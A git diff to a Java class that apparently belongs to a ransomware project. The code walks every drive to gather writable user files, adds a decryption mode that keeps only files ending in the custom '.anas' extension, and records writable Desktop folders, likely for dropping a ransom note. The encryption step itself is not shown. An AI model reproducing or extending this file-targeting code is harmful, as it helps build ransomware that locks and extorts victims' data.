@@ -1,5 +1,7 @@
 package files;
 
+import enums.To;
+
 import java.io.File;
 import java.util.ArrayList;
 import java.util.Arrays;
@@ -7,9 +9,11 @@ import java.util.Objects;
 
 public class GetFiles {
     private File[] drivers;
+    private ArrayList<File> desktops;
 
     public GetFiles() {
         drivers = scanDrivers();
+        desktops = new ArrayList();
     }
 
     private File[] scanDrivers() { // Get partitions
@@ -20,7 +24,7 @@ public class GetFiles {
         return drivers;
     }
 
-    public ArrayList<File> scanFiles(File drive) {
+    public ArrayList<File> scanFiles(File drive, To to) {
         ArrayList<File> files = new ArrayList(Arrays.asList(Objects.requireNonNull(drive.listFiles())));
 
         int i = 0;
@@ -36,6 +40,9 @@ public class GetFiles {
         do {
             File file = files.get(i);
             while (file.isDirectory()) {
+                if (file.getName().equals("Desktop") && file.canWrite())
+                    desktops.add(file);
+                    
                 if (file.canWrite() && !file.isHidden() && file.listFiles() != null) {
                     files.remove(i);
                     files.addAll(i, Arrays.asList(file.listFiles()));
@@ -52,9 +59,19 @@ public class GetFiles {
         } while (!isEnd);
 
         // Delete directories and can't write files
-        for (int j = 0; j < files.size(); j++)
-            if (files.get(j).isDirectory() || !files.get(j).canWrite())
+        for (int j = 0; j < files.size(); j++) {
+            File file = files.get(j);
+            if (to == To.DECRYPTION && !file.getName().endsWith(".anas")) {
                 files.remove(j--);
+                continue;
+            }
+            if (file.isDirectory() || !file.canWrite())
+                files.remove(j--);
+        }
         return files;
+    }
+
+    public ArrayList<File> getDesktops() {
+        return desktops;
     }
 }
